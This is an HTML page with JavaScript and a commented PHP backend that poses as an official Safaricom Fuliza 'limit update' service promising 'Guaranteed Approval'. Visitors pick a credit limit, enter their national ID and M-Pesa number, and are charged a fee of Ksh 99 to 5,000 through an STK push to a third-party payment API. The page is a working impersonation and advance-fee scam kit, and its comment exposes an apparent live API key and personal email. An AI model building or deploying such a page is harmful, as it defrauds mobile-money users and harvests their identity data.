<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Limit Updates</title>
  <style>
    :root {
      --bg: #eef2ef;
      --card: #f7f9f7;
      --white: #ffffff;
      --green: #22b14c;
      --green-dark: #14923b;
      --green-soft: #eaf7ee;
      --green-border: #bfe7c9;
      --text: #16321d;
      --muted: #6d7a75;
      --line: #e3e8e4;
      --shadow: 0 18px 40px rgba(22, 50, 29, 0.08);
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: Inter, Arial, Helvetica, sans-serif;
      background: #dfe3e0;
      color: var(--text);
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
    }

    .phone-frame {
      width: 100%;
      max-width: 450px;
      background: var(--card);
      border: 1px solid #d9dfda;
      box-shadow: 0 16px 35px rgba(0, 0, 0, 0.08);
      overflow: hidden;
      min-height: 860px;
      position: relative;
    }

    .top-bar {
      height: 10px;
      background: linear-gradient(90deg, #325dcb 0 100%);
    }

    .screen { display: none; }
    .screen.active { display: block; }

    .hero {
      background: var(--white);
      padding: 32px 24px 24px;
      text-align: center;
      border-bottom: 1px solid var(--line);
      position: relative;
    }

    .hero.compact {
      padding-top: 28px;
      padding-bottom: 20px;
    }

    .back-btn {
      position: absolute;
      left: 18px;
      top: 36px;
      border: none;
      background: transparent;
      color: #122033;
      font-size: 30px;
      line-height: 1;
      cursor: pointer;
      padding: 0;
    }

    .brand-mark {
      position: absolute;
      left: 42px;
      top: 33px;
      width: 3px;
      height: 18px;
      border-radius: 2px;
      background: #7b542e;
    }

    .pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      border: 1px solid var(--green-border);
      background: var(--green-soft);
      color: var(--green-dark);
      border-radius: 999px;
      padding: 10px 18px;
      font-size: 12px;
      font-weight: 800;
      letter-spacing: 0.25em;
      text-transform: uppercase;
    }

    .pill .dot {
      width: 6px;
      height: 6px;
      background: #7ad68c;
      border-radius: 50%;
    }

    h1 {
      margin: 22px 0 10px;
      font-size: 42px;
      line-height: 0.95;
      color: var(--green-dark);
      font-weight: 900;
      letter-spacing: -0.04em;
    }

    .underline {
      width: 48px;
      height: 4px;
      border-radius: 999px;
      background: var(--green);
      margin: 0 auto 18px;
    }

    .subtitle {
      margin: 0;
      font-size: 14px;
      color: #7180a1;
      font-weight: 700;
    }

    .content {
      background: var(--bg);
      padding: 22px;
    }

    .notice {
      display: flex;
      align-items: center;
      gap: 14px;
      background: var(--green-soft);
      border: 1px solid #d7eadc;
      border-radius: 18px;
      padding: 16px 18px;
      margin-bottom: 24px;
    }

    .icon-circle {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: #cfeeda;
      color: var(--green-dark);
      display: grid;
      place-items: center;
      flex: 0 0 auto;
      font-size: 18px;
      font-weight: 900;
    }

    .notice p {
      margin: 0;
      font-size: 14px;
      line-height: 1.45;
      color: #245033;
      font-weight: 600;
    }

    .section-title {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 16px;
      font-size: 15px;
      font-weight: 800;
      color: #1a2b22;
    }

    .section-title .mini {
      width: 18px;
      height: 18px;
      border-radius: 4px;
      background: var(--green);
      color: white;
      display: grid;
      place-items: center;
      font-size: 11px;
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 14px;
    }

    .option {
      position: relative;
      background: var(--white);
      border: 1.6px solid #dde5df;
      border-radius: 18px;
      padding: 20px 14px 18px;
      text-align: center;
      cursor: pointer;
      transition: 0.2s ease;
      min-height: 95px;
    }

    .option:hover { transform: translateY(-1px); border-color: #b9d8c1; }

    .option.active {
      border: 2px solid var(--green);
      background: #f2fbf5;
      box-shadow: inset 0 0 0 1px rgba(34, 177, 76, 0.08);
    }

    .amount {
      display: block;
      font-size: 18px;
      font-weight: 900;
      color: var(--green-dark);
      margin-bottom: 14px;
      letter-spacing: -0.02em;
    }

    .fee {
      display: inline-block;
      padding: 7px 14px;
      border-radius: 999px;
      font-size: 12px;
      font-weight: 800;
      color: var(--green-dark);
      background: var(--green-soft);
      border: 1px solid #d8ecde;
    }

    .check {
      position: absolute;
      top: 10px;
      right: 10px;
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: var(--green);
      color: white;
      display: none;
      place-items: center;
      font-size: 11px;
      font-weight: 900;
    }

    .option.active .check { display: grid; }

    .security {
      text-align: center;
      color: #97a2be;
      font-size: 13px;
      font-weight: 900;
      letter-spacing: 0.08em;
      margin: 26px 0 0;
      text-transform: uppercase;
    }

    .footer {
      background: var(--white);
      border-top: 1px solid var(--line);
      padding: 22px;
    }

    .button {
      width: 100%;
      border: none;
      background: linear-gradient(180deg, #29c356, #1fb24b);
      color: white;
      font-weight: 900;
      font-size: 18px;
      border-radius: 20px;
      padding: 18px 20px;
      cursor: pointer;
      box-shadow: 0 14px 28px rgba(31, 178, 75, 0.24);
    }

    .button:disabled {
      opacity: 0.7;
      cursor: wait;
    }

    .selection-output {
      margin-top: 12px;
      text-align: center;
      font-size: 13px;
      color: var(--muted);
      font-weight: 700;
    }

    .verify-wrap {
      padding: 20px 22px 26px;
      background: var(--bg);
      min-height: 590px;
    }

    .divider {
      height: 1px;
      background: var(--line);
      margin: 0 0 18px;
    }

    .verify-title {
      margin: 10px 0 12px;
      text-align: center;
      font-size: 26px;
      font-weight: 900;
      color: #11203a;
      letter-spacing: -0.03em;
    }

    .verify-subtitle {
      margin: 0 0 34px;
      text-align: center;
      color: #677390;
      font-size: 14px;
      line-height: 1.6;
      font-weight: 700;
    }

    .field-group { margin-bottom: 28px; }

    .field-label {
      display: block;
      margin-bottom: 14px;
      color: #2a3650;
      font-size: 15px;
      font-weight: 800;
    }

    .input,
    .prefix-box,
    .phone-input {
      border: 1px solid #e1e6eb;
      background: #f1f4f8;
      border-radius: 18px;
      min-height: 70px;
      color: #122033;
      font-size: 16px;
      font-weight: 800;
      outline: none;
    }

    .input {
      width: 100%;
      padding: 0 20px;
    }

    .input::placeholder,
    .phone-input::placeholder {
      color: #c1c8d0;
      font-weight: 800;
    }

    .phone-row {
      display: grid;
      grid-template-columns: 82px 1fr;
      gap: 12px;
    }

    .prefix-box {
      display: grid;
      place-items: center;
      font-size: 18px;
    }

    .phone-input {
      width: 100%;
      padding: 0 20px;
    }

    .summary-box {
      background: var(--white);
      border: 1px solid #e1e7e1;
      border-radius: 18px;
      padding: 16px 18px;
      margin: 6px 0 24px;
    }

    .summary-row {
      display: flex;
      justify-content: space-between;
      gap: 16px;
      font-size: 14px;
      padding: 6px 0;
    }

    .summary-row strong {
      color: #122033;
      font-size: 15px;
    }

    .helper, .status {
      margin-top: 14px;
      text-align: center;
      font-size: 13px;
      font-weight: 700;
    }

    .helper { color: #97a2be; letter-spacing: 0.08em; text-transform: uppercase; }
    .status { color: #677390; min-height: 18px; }
    .status.error { color: #c0392b; }
    .status.success { color: #14923b; }

    @media (max-width: 520px) {
      body { padding: 0; }
      .phone-frame { max-width: 100%; min-height: 100vh; }
      h1 { font-size: 34px; }
      .content, .footer, .hero, .verify-wrap { padding-left: 16px; padding-right: 16px; }
      .verify-title { font-size: 22px; }
    }
  </style>
</head>
<body>
  <div class="phone-frame">
    <div class="top-bar"></div>

    <section class="screen active" id="screen1">
      <section class="hero">
        <div class="pill"><span class="dot"></span> SAFARICOM OFFICIAL</div>
        <h1>FulizaUpdatess</h1>
        <div class="underline"></div>
        <p class="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </section>

      <main class="content">
        <div class="notice">
          <div class="icon-circle">⚡</div>
          <p>Choose your new limit and complete the payment to get instant access.</p>
        </div>

        <div class="section-title">
          <span class="mini">▣</span>
          <span>Select Your Limit</span>
        </div>

        <div class="grid" id="limitGrid">
          <div class="option active" data-amount="Ksh 5,000" data-fee="99">
            <span class="check">✓</span>
            <span class="amount">Ksh 5,000</span>
            <span class="fee">Fee: Ksh 99</span>
          </div>
          <div class="option" data-amount="Ksh 10,000" data-fee="250">
            <span class="check">✓</span>
            <span class="amount">Ksh 10,000</span>
            <span class="fee">Fee: Ksh 250</span>
          </div>
          <div class="option" data-amount="Ksh 15,000" data-fee="500">
            <span class="check">✓</span>
            <span class="amount">Ksh 15,000</span>
            <span class="fee">Fee: Ksh 500</span>
          </div>
          <div class="option" data-amount="Ksh 20,000" data-fee="1000">
            <span class="check">✓</span>
            <span class="amount">Ksh 20,000</span>
            <span class="fee">Fee: Ksh 1,000</span>
          </div>
          <div class="option" data-amount="Ksh 25,000" data-fee="1500">
            <span class="check">✓</span>
            <span class="amount">Ksh 25,000</span>
            <span class="fee">Fee: Ksh 1,500</span>
          </div>
          <div class="option" data-amount="Ksh 30,000" data-fee="2500">
            <span class="check">✓</span>
            <span class="amount">Ksh 30,000</span>
            <span class="fee">Fee: Ksh 2,500</span>
          </div>
          <div class="option" data-amount="Ksh 35,000" data-fee="3500">
            <span class="check">✓</span>
            <span class="amount">Ksh 35,000</span>
            <span class="fee">Fee: Ksh 3,500</span>
          </div>
          <div class="option" data-amount="Ksh 45,000" data-fee="5000">
            <span class="check">✓</span>
            <span class="amount">Ksh 45,000</span>
            <span class="fee">Fee: Ksh 5,000</span>
          </div>
        </div>

        <div class="security">🛡 Verified Secure • End-to-End Encrypted</div>
      </main>

      <footer class="footer">
        <button class="button" id="continueBtn">Continue</button>
        <div class="selection-output" id="selectionOutput">Selected: Ksh 5,000 · Fee: Ksh 99</div>
      </footer>
    </section>

    <section class="screen" id="screen2">
      <section class="hero compact">
        <button class="back-btn" id="backBtn" aria-label="Go back">‹</button>
        <div class="brand-mark"></div>
        <div class="pill"><span class="dot"></span> SAFARICOM OFFICIAL</div>
        <h1>FulizaUpdatess</h1>
        <div class="underline"></div>
        <p class="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </section>

      <div class="verify-wrap">
        <div class="divider"></div>
        <h2 class="verify-title">Identify Yourself</h2>
        <p class="verify-subtitle">This information is required to verify your eligibility for the limit increase.</p>

        <div class="summary-box">
          <div class="summary-row"><span>Selected Limit</span><strong id="summaryAmount">Ksh 5,000</strong></div>
          <div class="summary-row"><span>Fee to Pay</span><strong id="summaryFee">Ksh 99</strong></div>
        </div>

        <form id="paymentForm">
          <div class="field-group">
            <label class="field-label" for="idNumber">National ID Number</label>
            <input class="input" type="text" id="idNumber" name="idNumber" placeholder="Enter ID Number" inputmode="numeric" maxlength="12" required>
          </div>

          <div class="field-group">
            <label class="field-label" for="phoneNumber">M-Pesa Registered Number</label>
            <div class="phone-row">
              <div class="prefix-box">+254</div>
              <input class="phone-input" type="tel" id="phoneNumber" name="phoneNumber" placeholder="7xx xxx xxx" inputmode="numeric" maxlength="9" required>
            </div>
          </div>

          <button class="button" id="payBtn" type="submit">Verify &amp; Continue</button>
          <div class="status" id="paymentStatus"></div>
          <div class="helper">Secure 256-Bit Encryption</div>
        </form>
      </div>
    </section>
  </div>

  <script>
    const options = document.querySelectorAll('.option');
    const output = document.getElementById('selectionOutput');
    const continueBtn = document.getElementById('continueBtn');
    const backBtn = document.getElementById('backBtn');
    const screen1 = document.getElementById('screen1');
    const screen2 = document.getElementById('screen2');
    const summaryAmount = document.getElementById('summaryAmount');
    const summaryFee = document.getElementById('summaryFee');
    const paymentForm = document.getElementById('paymentForm');
    const paymentStatus = document.getElementById('paymentStatus');
    const payBtn = document.getElementById('payBtn');

    function getActiveOption() {
      return document.querySelector('.option.active');
    }

    function formatFee(fee) {
      return `Ksh ${Number(fee).toLocaleString()}`;
    }

    function updateSelection(card) {
      options.forEach(option => option.classList.remove('active'));
      card.classList.add('active');
      output.textContent = `Selected: ${card.dataset.amount} · Fee: ${formatFee(card.dataset.fee)}`;
    }

    function showScreen(target) {
      [screen1, screen2].forEach(screen => screen.classList.remove('active'));
      target.classList.add('active');
    }

    function syncSummary() {
      const active = getActiveOption();
      summaryAmount.textContent = active.dataset.amount;
      summaryFee.textContent = formatFee(active.dataset.fee);
    }

    function normalizeKenyanPhone(localDigits) {
      const cleaned = String(localDigits).replace(/\D/g, '');
      if (!/^7\d{8}$/.test(cleaned)) return null;
      return `254${cleaned}`;
    }

    options.forEach(card => {
      card.addEventListener('click', () => updateSelection(card));
    });

    continueBtn.addEventListener('click', () => {
      syncSummary();
      paymentStatus.textContent = '';
      paymentStatus.className = 'status';
      showScreen(screen2);
    });

    backBtn.addEventListener('click', () => {
      showScreen(screen1);
    });

    paymentForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const active = getActiveOption();
      const idNumber = document.getElementById('idNumber').value.trim();
      const phoneInput = document.getElementById('phoneNumber').value.trim();
      const normalizedPhone = normalizeKenyanPhone(phoneInput);

      if (!/^\d{6,12}$/.test(idNumber)) {
        paymentStatus.textContent = 'Please enter a valid ID number.';
        paymentStatus.className = 'status error';
        return;
      }

      if (!normalizedPhone) {
        paymentStatus.textContent = 'Please enter a valid Safaricom number in the format 7xxxxxxxx.';
        paymentStatus.className = 'status error';
        return;
      }

      const payload = {
        id_number: idNumber,
        msisdn: normalizedPhone,
        amount: Number(active.dataset.fee),
        selected_limit: active.dataset.amount,
        reference: `LIMIT-${Date.now()}`
      };

      payBtn.disabled = true;
      payBtn.textContent = 'Processing...';
      paymentStatus.textContent = 'Initializing M-Pesa payment request...';
      paymentStatus.className = 'status';

      try {
        // Replace this endpoint with your own backend file.
        // Example PHP file: /api/initiate-payment.php
        const response = await fetch('/api/initiate-payment.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.message || 'Payment request failed.');
        }

        paymentStatus.textContent = result.message || 'STK push sent successfully. Complete payment on your phone.';
        paymentStatus.className = 'status success';
      } catch (error) {
        paymentStatus.textContent = error.message || 'Unable to start payment. Please try again.';
        paymentStatus.className = 'status error';
      } finally {
        payBtn.disabled = false;
        payBtn.textContent = 'Verify & Continue';
      }
    });
  </script>

  <!--
    BACKEND EXAMPLE: /api/initiate-payment.php

    <?php
    header('Content-Type: application/json');

    $input = json_decode(file_get_contents('php://input'), true);

    $apiKey = 'MGPYlWU6lMpS';
    $email = 'denniskoskey5@gmail.com';

    if (!$input || empty($input['msisdn']) || empty($input['amount']) || empty($input['reference'])) {
        http_response_code(400);
        echo json_encode(['message' => 'Missing required fields.']);
        exit;
    }

    $payload = [
        'api_key' => $apiKey,
        'email' => $email,
        'amount' => (int)$input['amount'],
        'msisdn' => $input['msisdn'],
        'reference' => $input['reference']
    ];

    $ch = curl_init('https://megapay.co.ke/backend/v1/initiatestk');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);

    if ($curlError) {
        http_response_code(500);
        echo json_encode(['message' => 'cURL error: ' . $curlError]);
        exit;
    }

    $decoded = json_decode($response, true);

    if ($httpCode >= 200 && $httpCode < 300) {
        echo json_encode([
            'success' => true,
            'message' => $decoded['message'] ?? 'STK push initiated successfully.',
            'data' => $decoded
        ]);
    } else {
        http_response_code($httpCode ?: 500);
        echo json_encode([
            'success' => false,
            'message' => $decoded['message'] ?? 'MegaPay request failed.',
            'data' => $decoded
        ]);
    }
    ?>
  -->
</body>
</html>
